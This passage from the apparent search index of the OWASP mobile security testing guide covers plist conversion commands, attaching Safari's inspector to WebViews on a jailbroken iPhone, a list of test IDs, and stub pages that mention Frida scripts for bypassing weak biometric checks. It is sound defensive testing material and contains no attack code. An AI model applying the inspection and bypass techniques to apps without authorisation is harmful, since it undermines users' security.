NSPrivacyAccessedAPITypeReasons = Array {\n            CA92.1\n            1C8F.1\n            C56D.1\n        }\n    }\n    ...\n}\n</code></pre> <p>You can dive deeper into the file to extract more specific information. For example, you can get the <code>NSPrivacyAccessedAPITypeReasons</code> of the first <code>NSPrivacyAccessedAPITypes</code> element (index <code>0</code>) this way:</p> <pre><code>/usr/libexec/PlistBuddy -c \"Print NSPrivacyAccessedAPITypes:0:NSPrivacyAccessedAPITypeReasons\" ./SocialApp.app/PrivacyInfo.xcprivacy\n\nArray {\n    CA92.1\n    1C8F.1\n    C56D.1\n}\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0138/","title":"MASTG-TECH-0138: Convert Plist Files to JSON","text":"<p>You can convert Plist files, such as <code>Info.plist</code> or <code>PrivacyInfo.xcprivacy</code> (also a Plist file despite the extension), to JSON format for easier readability and analysis.</p>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0138/#using-plutil","title":"Using plutil","text":"<p>Use  Plutil to convert any Plist files, such as <code>PrivacyInfo.xcprivacy</code>, to JSON format:</p> <pre><code>plutil -convert json -o PrivacyInfo.xcprivacy.json SocialApp.app/PrivacyInfo.xcprivacy\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0138/#using-plistlib","title":"Using plistlib","text":"<p>Use Python's built-in  plistlib module to convert any Plist files, such as <code>PrivacyInfo.xcprivacy</code>, to JSON format:</p> <pre><code>import plistlib\nimport json\n\nwith open('SocialApp.app/PrivacyInfo.xcprivacy', 'rb') as fp:\n    data = plistlib.load(fp)\n\nwith open('PrivacyInfo.json', 'w', encoding='utf-8') as fp:\n    json.dump(data, fp, indent=2, ensure_ascii=False)\n</code></pre> <p>Which outputs:</p> <pre><code>{\n  \"NSPrivacyAccessedAPITypes\": [\n    {\n      \"NSPrivacyAccessedAPIType\": \"NSPrivacyAccessedAPICategoryUserDefaults\",\n      \"NSPrivacyAccessedAPITypeReasons\": [\n        \"CA92.1\",\n        \"1C8F.1\",\n        \"C56D.1\"\n      ]\n    },\n    ...\n  ],\n  \"NSPrivacyCollectedDataTypes\": [\n    {\n      \"NSPrivacyCollectedDataType\": \"NSPrivacyCollectedDataTypeName\",\n      \"NSPrivacyCollectedDataTypeLinked\": true,\n      \"NSPrivacyCollectedDataTypePurposes\": [\n        \"NSPrivacyCollectedDataTypePurposeAppFunctionality\",\n        \"NSPrivacyCollectedDataTypePurposeOther\"\n      ],\n      \"NSPrivacyCollectedDataTypeTracking\": false\n    },\n    ...\n  ],\n  \"NSPrivacyTracking\": true,\n  \"NSPrivacyTrackingDomains\": [\n    \"trk-v2.socialapp.com\",\n    \"trk-v2.socialapp.us\",\n    ...\n  ]\n}\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0138/#using-ipsw","title":"Using IPSW","text":"<p>Use  ipsw to convert any Plist files, such as <code>Info.plist</code>, to JSON format:</p> <pre><code>$ ipsw plist ./Info.plist\n{\n    \"BuildMachineOSBuild\": \"23B74\",\n    \"CFBundleDevelopmentRegion\": \"en\",\n    \"CFBundleExecutable\": \"MASTestApp\",\n    \"CFBundleIdentifier\": \"org.owasp.mastestapp.MASTestApp\",\n    \"CFBundleInfoDictionaryVersion\": \"6.0\",\n    \"CFBundleName\": \"MASTestApp\",\n    \"CFBundlePackageType\": \"APPL\",\n    \"CFBundleShortVersionString\": \"1.0\",\n    \"CFBundleSupportedPlatforms\": [\n        \"iPhoneOS\"\n    ],\n    ...\n}\n</code></pre>","tags":["ios","tech"]},{"location":"MASTG/techniques/ios/MASTG-TECH-0139/","title":"MASTG-TECH-0139: Attach to WKWebView","text":"<p>After installing  GlobalWebInspect on a jailbroken device, it is possible to attach the Safari developer tools to any <code>WKWebView</code> inside of applications installed from the App Store.</p> <p>To activate the web inspection, follow these steps:</p> <ol> <li>On the iOS device open the Settings app: Go to Safari -&gt; Advanced and toggle on Web Inspector.</li> <li>On the macOS device, open Safari: in the menu bar, go to Safari -&gt; Preferences -&gt; Advanced and enable Show Develop menu in menu bar.</li> <li>Connect your iOS device to the macOS device and unlock it: the iOS device name should appear in the Develop menu.</li> <li>(If not yet trusted) On macOS's Safari, go to the Develop menu, click on the 'iOS device name' -&gt; Use for Development and enable trust.</li> </ol> <p>To open the web inspector and debug a WebView:</p> <ol> <li>In iOS, open the app and navigate to any screen containing a WebView.</li> <li>In macOS Safari, go to Developer -&gt; 'iOS Device Name' and you should see the name of the WebView-based context. Click on it to open the Web Inspector.</li> </ol> <p>Now you're able to debug the WebView as you would with a regular web page on your desktop browser.</p> <p></p> <p>If everything is set up correctly, you can attach to any WebView with Safari:</p> <p></p> <p></p>","tags":["macOS","tech"]},{"location":"MASTG/tests/","title":"MASTG Tests","text":"About the MASTG Tests <p>The MASTG \"Atomic Tests\" are a new addition to the MAS project. They are a collection of small, individual tests that can be used to assess the security and privacy of a mobile application. Each test is designed to be simple and focused on a single issue. The goal is to make it easier for developers and security professionals to identify and fix issues in their mobile applications.</p> <p>Tests are organized into categories based on the OWASP MASVS and have a weakness assigned from the OWASP MASWE.</p> <p>Each test includes:</p> <ul> <li>Overview: A brief description of the test.</li> <li>Steps: A set of steps to follow to identify the weakness in a mobile application.</li> <li>Observation: A description of the results of running the test against an application.</li> <li>Evaluation: Specific instructions for evaluating the results of the test.</li> </ul> <p>Each test comes with a collection of demos that demonstrate the weakness in a sample application. These demos are written in markdown and are located in the Demos section of the MASTG.</p> ID Title Platform L1 L2 R P Status MASTG-TEST-0049  Testing Emulator Detection platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0227  Debugging Enabled for WebViews platform:android profile:R newstatus:new MASTG-TEST-0264  Runtime Use of StrictMode APIs platform:android profile:R newstatus:new MASTG-TEST-0226  Debuggable Flag Enabled in the AndroidManifest platform:android profile:R newstatus:new MASTG-TEST-0224  Usage of Insecure Signature Version platform:android profile:R newstatus:new MASTG-TEST-0263  Logging of StrictMode Violations platform:android profile:R newstatus:new MASTG-TEST-0040  Testing for Debugging Symbols platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0039  Testing whether the App is Debuggable platform:android profile:R deprecatedstatus:deprecated MASTG-TEST-0265  References to StrictMode APIs platform:android profile:R newstatus:new MASTG-TEST-0045  Testing Root Detection platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0048  Testing Reverse Engineering Tools Detection platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0051  Testing Obfuscation platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0041  Testing for Debugging Code and Verbose Error Logging platform:android profile:R deprecatedstatus:deprecated MASTG-TEST-0046  Testing Anti-Debugging Detection platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0249  Runtime Use of Secure Screen Lock Detection APIs platform:android profile:L2 newstatus:new MASTG-TEST-0050  Testing Runtime Integrity Checks platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0247  References to APIs for Detecting Secure Screen Lock platform:android profile:L2 newstatus:new MASTG-TEST-0038  Making Sure that the App is Properly Signed platform:android profile:R deprecatedstatus:deprecated MASTG-TEST-0047  Testing File Integrity Checks platform:android profile:R update-pendingstatus:update-pending MASTG-TEST-0225  Usage of Insecure Signature Key Size platform:android profile:R newstatus:new MASTG-TEST-0255  Permission Requests Not Minimized platform:android profile:P placeholderstatus:placeholder MASTG-TEST-0257  Not Resetting Unused Permissions platform:android profile:P placeholderstatus:placeholder MASTG-TEST-0256  Missing Permission Rationale platform:android profile:P placeholderstatus:placeholder MASTG-TEST-0254  Dangerous App Permissions platform:android profile:P newstatus:new MASTG-TEST-0206  Sensitive Data in Network Traffic Capture platform:android profile:P newstatus:new MASTG-TEST-0034  Testing Object Persistence platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0042  Checking for Weaknesses in Third Party Libraries platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0026  Testing Implicit Intents platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0036  Testing Enforced Updating platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0223  Stack Canaries Not Enabled platform:android profile:L2 newstatus:new MASTG-TEST-0002  Testing Local Storage for Input Validation platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0222  Position Independent Code (PIC) Not Enabled platform:android profile:L2 newstatus:new MASTG-TEST-0272  Identify Dependencies with Known Vulnerabilities in the Android Project platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0274  Dependencies with Known Vulnerabilities in the App's SBOM platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0027  Testing for URL Loading in WebViews platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0245  References to Platform Version APIs platform:android profile:L2 newstatus:new MASTG-TEST-0044  Make Sure That Free Security Features Are Activated platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0025  Testing for Injection Flaws platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0043  Memory Corruption Bugs platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0022  Testing Custom Certificate Stores and Certificate Pinning platform:android profile:L2 deprecatedstatus:deprecated MASTG-TEST-0238  Runtime Use of Network APIs Transmitting Cleartext Traffic platform:android profile:L1 profile:L2 placeholderstatus:placeholder MASTG-TEST-0019  Testing Data Encryption on the Network platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0244  Missing Certificate Pinning in Network Traffic platform:network profile:L2 newstatus:new MASTG-TEST-0286  Network Security Configuration Allowing Trust in User-Provided CAs platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0242  Missing Certificate Pinning in Network Security Configuration platform:android profile:L2 newstatus:new MASTG-TEST-0283  Incorrect Implementation of Server Hostname Verification platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0234  Missing Implementation of Server Hostname Verification with SSLSockets platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0020  Testing the TLS Settings platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0023  Testing the Security Provider platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0236  Cleartext Traffic Observed on the Network platform:network profile:L1 profile:L2 newstatus:new MASTG-TEST-0021  Testing Endpoint Identify Verification platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0243  Expired Certificate Pins in the Network Security Configuration platform:android profile:L2 newstatus:new MASTG-TEST-0285  Outdated Android Version Allowing Trust in User-Provided CAs platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0233  Hardcoded HTTP URLs platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0282  Unsafe Custom Trust Evaluation platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0237  Cross-Platform Framework Configurations Allowing Cleartext Traffic platform:android profile:L1 profile:L2 placeholderstatus:placeholder MASTG-TEST-0218  Insecure TLS Protocols in Network Traffic platform:network profile:L1 profile:L2 newstatus:new MASTG-TEST-0284  Incorrect SSL Error Handling in WebViews platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0217  Insecure TLS Protocols Explicitly Allowed in Code platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0239  Using low-level APIs (e.g. Socket) to set up a custom HTTP connection platform:android profile:L1 profile:L2 placeholderstatus:placeholder MASTG-TEST-0235  Android App Configurations Allowing Cleartext Traffic platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0251  Runtime Use of Content Provider Access APIs in WebViews platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0253  Runtime Use of Local File Access APIs in WebViews platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0252  References to Local File Access in WebViews platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0010  Finding Sensitive Information in Auto-Generated Screenshots platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0008  Checking for Sensitive Data Disclosure Through the User Interface platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0028  Testing Deep Links platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0033  Testing for Java Objects Exposed Through WebViews platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0032  Testing WebView Protocol Handlers platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0024  Testing for App Permissions platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0037  Testing WebViews Cleanup platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0250  References to Content Provider Access in WebViews platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0007  Determining Whether Sensitive Stored Data Has Been Exposed via IPC Mechanisms platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0030  Testing for Vulnerable Implementation of PendingIntent platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0029  Testing for Sensitive Functionality Exposure Through IPC platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0035  Testing for Overlay Attacks platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0031  Testing JavaScript Execution in WebViews platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0258  References to Keyboard Caching Attributes in UI Elements platform:android profile:L2 newstatus:new MASTG-TEST-0216  Sensitive Data Not Excluded From Backup platform:android profile:L1 profile:L2 profile:P newstatus:new MASTG-TEST-0231  References to Logging APIs platform:android profile:L1 profile:L2 profile:P newstatus:new MASTG-TEST-0001  Testing Local Storage for Sensitive Data platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0287  Sensitive Data Stored Unencrypted via the SharedPreferences API to the App Sandbox platform:android profile:L1 profile:L2 placeholderstatus:placeholder MASTG-TEST-0003  Testing Logs for Sensitive Data platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0005  Determining Whether Sensitive Data Is Shared with Third Parties via Notifications platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0012  Testing the Device-Access-Security Policy platform:android profile:L2 deprecatedstatus:deprecated MASTG-TEST-0009  Testing Backups for Sensitive Data platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0201  Runtime Use of APIs to Access External Storage platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0004  Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0207  Data Stored in the App Sandbox at Runtime platform:android profile:L2 newstatus:new MASTG-TEST-0262  References to Backup Configurations Not Excluding Sensitive Data platform:android profile:L1 profile:L2 profile:P newstatus:new MASTG-TEST-0200  Files Written to External Storage platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0203  Runtime Use of Logging APIs platform:android profile:L1 profile:L2 profile:P newstatus:new MASTG-TEST-0006  Determining Whether the Keyboard Cache Is Disabled for Text Input Fields platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0011  Testing Memory for Sensitive Data platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0202  References to APIs and Permissions for Accessing External Storage platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0018  Testing Biometric Authentication platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0017  Testing Confirm Credentials platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0016  Testing Random Number Generation platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0212  Use of Hardcoded Cryptographic Keys in Code platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0014  Testing the Configuration of Cryptographic Standard Algorithms platform:android profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0204  Insecure Random API Usage platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0013  Testing Symmetric Cryptography platform:android profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0208  Insufficient Key Sizes platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0205  Non-random Sources Usage platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0221  Broken Symmetric Encryption Algorithms platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0015  Testing the Purposes of Keys platform:android profile:L2 update-pendingstatus:update-pending MASTG-TEST-0232  Broken Symmetric Encryption Modes platform:android profile:L1 profile:L2 newstatus:new MASTG-TEST-0089  Testing Anti-Debugging Detection platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0219  Testing for Debugging Symbols platform:ios profile:R newstatus:new MASTG-TEST-0092  Testing Emulator Detection platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0241  Runtime Use of Jailbreak Detection Techniques platform:ios profile:R newstatus:new MASTG-TEST-0240  Jailbreak Detection in Code platform:ios profile:R newstatus:new MASTG-TEST-0248  References to APIs for Detecting Secure Screen Lock platform:ios profile:L2 newstatus:new MASTG-TEST-0246  Runtime Use of Secure Screen Lock Detection APIs platform:ios profile:L2 newstatus:new MASTG-TEST-0093  Testing Obfuscation platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0261  Debuggable Entitlement Enabled in the entitlements.plist platform:ios profile:R newstatus:new MASTG-TEST-0084  Testing for Debugging Code and Verbose Error Logging platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0082  Testing whether the App is Debuggable platform:ios profile:R deprecatedstatus:deprecated MASTG-TEST-0083  Testing for Debugging Symbols platform:ios profile:R deprecatedstatus:deprecated MASTG-TEST-0091  Testing Reverse Engineering Tools Detection platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0090  Testing File Integrity Checks platform:ios profile:R update-pendingstatus:update-pending MASTG-TEST-0220  Usage of Outdated Code Signature Format platform:ios profile:R newstatus:new MASTG-TEST-0088  Testing Jailbreak Detection platform:ios profile:R deprecatedstatus:deprecated MASTG-TEST-0081  Making Sure that the App Is Properly Signed platform:ios profile:R deprecatedstatus:deprecated MASTG-TEST-0281  Undeclared Known Tracking Domains platform:ios profile:P newstatus:new MASTG-TEST-0080  Testing Enforced Updating platform:ios profile:L2 update-pendingstatus:update-pending MASTG-TEST-0085  Checking for Weaknesses in Third Party Libraries platform:ios profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0275  Dependencies with Known Vulnerabilities in the App's SBOM platform:ios profile:L1 profile:L2 newstatus:new MASTG-TEST-0273  Identify Dependencies with Known Vulnerabilities by Scanning Dependency Managers Artifacts platform:ios profile:L1 profile:L2 newstatus:new MASTG-TEST-0086  Memory Corruption Bugs platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0230  Automatic Reference Counting (ARC) not enabled platform:ios profile:L2 newstatus:new MASTG-TEST-0087  Make Sure That Free Security Features Are Activated platform:ios profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0229  Stack Canaries Not enabled platform:ios profile:L2 newstatus:new MASTG-TEST-0228  Position Independent Code (PIC) not Enabled platform:ios profile:L2 newstatus:new MASTG-TEST-0079  Testing Object Persistence platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0068  Testing Custom Certificate Stores and Certificate Pinning platform:ios profile:L2 update-pendingstatus:update-pending MASTG-TEST-0065  Testing Data Encryption on the Network platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0066  Testing the TLS Settings platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0067  Testing Endpoint Identity Verification platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0280  Pasteboard Contents Not Restricted to Local Device platform:ios profile:L2 newstatus:new MASTG-TEST-0277  Sensitive Data in the iOS General Pasteboard at Runtime platform:ios profile:L2 newstatus:new MASTG-TEST-0076  Testing iOS WebViews platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0278  Pasteboard Contents Not Cleared After Use platform:ios profile:L2 newstatus:new MASTG-TEST-0279  Pasteboard Contents Not Expiring platform:ios profile:L2 newstatus:new MASTG-TEST-0077  Testing WebView Protocol Handlers platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0072  Testing App Extensions platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0057  Checking for Sensitive Data Disclosed Through the User Interface platform:ios profile:L2 update-pendingstatus:update-pending MASTG-TEST-0071  Testing UIActivity Sharing platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0070  Testing Universal Links platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0069  Testing App Permissions platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0078  Determining Whether Native Methods Are Exposed Through WebViews platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0073  Testing UIPasteboard platform:ios profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0056  Determining Whether Sensitive Data Is Exposed via IPC Mechanisms platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0276  Use of the iOS General Pasteboard platform:ios profile:L2 newstatus:new MASTG-TEST-0059  Testing Auto-Generated Screenshots for Sensitive Information platform:ios profile:L2 update-pendingstatus:update-pending MASTG-TEST-0075  Testing Custom URL Schemes platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0054  Determining Whether Sensitive Data Is Shared with Third Parties platform:ios profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0052  Testing Local Data Storage platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0055  Finding Sensitive Data in the Keyboard Cache platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0060  Testing Memory for Sensitive Data platform:ios profile:L2 update-pendingstatus:update-pending MASTG-TEST-0053  Checking Logs for Sensitive Data platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0215  Sensitive Data Not Excluded From Backup platform:ios profile:L1 profile:L2 profile:P newstatus:new MASTG-TEST-0058  Testing Backups for Sensitive Data platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0064  Testing Biometric Authentication platform:ios profile:L2 deprecatedstatus:deprecated MASTG-TEST-0266  References to APIs for Event-Bound Biometric Authentication platform:ios profile:L2 newstatus:new MASTG-TEST-0267  Runtime Use Of Event-Bound Biometric Authentication platform:ios profile:L2 newstatus:new MASTG-TEST-0268  References to APIs Allowing Fallback to Non-Biometric Authentication platform:ios profile:L2 newstatus:new MASTG-TEST-0271  Runtime Use Of APIs Detecting Biometric Enrollment Changes platform:ios profile:L2 newstatus:new MASTG-TEST-0269  Runtime Use Of APIs Allowing Fallback to Non-Biometric Authentication platform:ios profile:L2 newstatus:new MASTG-TEST-0270  References to APIs Detecting Biometric Enrollment Changes platform:ios profile:L2 newstatus:new MASTG-TEST-0211  Broken Hashing Algorithms platform:ios profile:L1 profile:L2 newstatus:new MASTG-TEST-0062  Testing Key Management platform:ios profile:L2 deprecatedstatus:deprecated MASTG-TEST-0214  Hardcoded Cryptographic Keys in Files platform:ios profile:L1 profile:L2 newstatus:new MASTG-TEST-0061  Verifying the Configuration of Cryptographic Standard Algorithms platform:ios profile:L1 profile:L2 deprecatedstatus:deprecated MASTG-TEST-0209  Insufficient Key Sizes platform:ios profile:L1 profile:L2 newstatus:new MASTG-TEST-0210  Broken Symmetric Encryption Algorithms platform:ios profile:L1 profile:L2 newstatus:new MASTG-TEST-0063  Testing Random Number Generation platform:ios profile:L1 profile:L2 update-pendingstatus:update-pending MASTG-TEST-0213  Use of Hardcoded Cryptographic Keys in Code platform:ios profile:L1 profile:L2 newstatus:new <p></p>","tags":[]},{"location":"MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0017/","title":"MASTG-TEST-0017: Testing Confirm Credentials","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0017: Testing Confirm Credentials (android)</p> <p> Send Feedback</p>","tags":["android","L2","test","MSTG-AUTH-1","MSTG-STORAGE-11","masvs-auth-2"]},{"location":"MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0017/#overview","title":"Overview","text":"","tags":["android","L2","test","MSTG-AUTH-1","MSTG-STORAGE-11","masvs-auth-2"]},{"location":"MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0017/#static-analysis","title":"Static Analysis","text":"<p>Make sure that the unlocked key is used during the application flow. For example, the key may be used to decrypt local storage or a message received from a remote endpoint. If the application simply checks whether the user has unlocked the key or not, the application may be vulnerable to a local authentication bypass.</p>","tags":["android","L2","test","MSTG-AUTH-1","MSTG-STORAGE-11","masvs-auth-2"]},{"location":"MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0017/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Validate the duration of time (seconds) for which the key is authorized to be used after the user is successfully authenticated. This is only needed if <code>setUserAuthenticationRequired</code> is used.</p>","tags":["android","L2","test","MSTG-AUTH-1","MSTG-STORAGE-11","masvs-auth-2"]},{"location":"MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0018/","title":"MASTG-TEST-0018: Testing Biometric Authentication","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0018: Testing Biometric Authentication (android)</p> <p> Send Feedback</p>","tags":["android","L2","test","MSTG-AUTH-8","masvs-auth-2"]},{"location":"MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0018/#overview","title":"Overview","text":"","tags":["android","L2","test","MSTG-AUTH-8","masvs-auth-2"]},{"location":"MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0018/#static-analysis","title":"Static Analysis","text":"<p>Note that there are quite some vendor/third party SDKs, which provide biometric support, but which have their own insecurities. Be very cautious when using third party SDKs to handle sensitive authentication logic.</p>","tags":["android","L2","test","MSTG-AUTH-8","masvs-auth-2"]},{"location":"MASTG/tests/android/MASVS-AUTH/MASTG-TEST-0018/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Please take a look at this detailed blog article about the Android KeyStore and Biometric authentication. This research includes two Frida scripts which can be used to test insecure implementations of biometric authentication and try to bypass them:</p> <ul> <li>Fingerprint bypass: This Frida script will bypass authentication when the <code>CryptoObject</code> is not used in the <code>authenticate</code> method of the <code>BiometricPrompt</code> class. The authentication implementation relies on the callback <code>onAuthenticationSucceded</code> being called.</li> <li>Fingerprint bypass via exception handling: This Frida script will attempt to bypass authentication when the <code>CryptoObject</code> is used, but used in an incorrect way. The detailed explanation can be found in the section \"Crypto Object Exception Handling\" in the blog post.</li> </ul>","tags":["android","L2","test","MSTG-AUTH-8","masvs-auth-2"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0002/","title":"MASTG-TEST-0002: Testing Local Storage for Input Validation","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0002: Testing Local Storage for Input Validation (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0002/#overview","title":"Overview","text":"<p>For any publicly accessible data storage, any process can override the data. This means that input validation needs to be applied the moment the data is read back again.</p> <p>Note: The same is true for private accessible data on a rooted device</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0002/#static-analysis","title":"Static analysis","text":"","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0002/#using-shared-preferences","title":"Using Shared Preferences","text":"<p>When you use the <code>SharedPreferences.Editor</code> to read or write int/boolean/long values, you cannot check whether the data is overridden or not. However: it can hardly be used for actual attacks other than chaining the values (e.g. no additional exploits can be packed which will take over the control flow). In the case of a <code>String</code> or a <code>StringSet</code> you should be careful with how the data is interpreted. Using reflection based persistence? Check the section on \"Testing Object Persistence\" for Android to see how it should be validated. Using the <code>SharedPreferences.Editor</code> to store and read certificates or keys? Make sure you have patched your security provider given vulnerabilities such as found in Bouncy Castle.</p> <p>In all cases, having the content HMACed can help to ensure that no additions and/or changes have been applied.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0002/#using-other-storage-mechanisms","title":"Using Other Storage Mechanisms","text":"<p>In case other public storage mechanisms (than the <code>SharedPreferences.Editor</code>) are used, the data needs to be validated the moment it is read from the storage mechanism.</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0025/","title":"MASTG-TEST-0025: Testing for Injection Flaws","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0025: Testing for Injection Flaws (android)</p> <p> Send Feedback</p>","tags":["android","L1","L2","test","MSTG-PLATFORM-2","masvs-code-4"]},{"location":"MASTG/tests/android/MASVS-CODE/MASTG-TEST-0025/#overview","title":"Overview","text":"<p>To test for injection flaws you need to first rely on other tests and check for functionality that might have been exposed:</p> <ul> <li> Testing Deep Links</li> <li> Testing 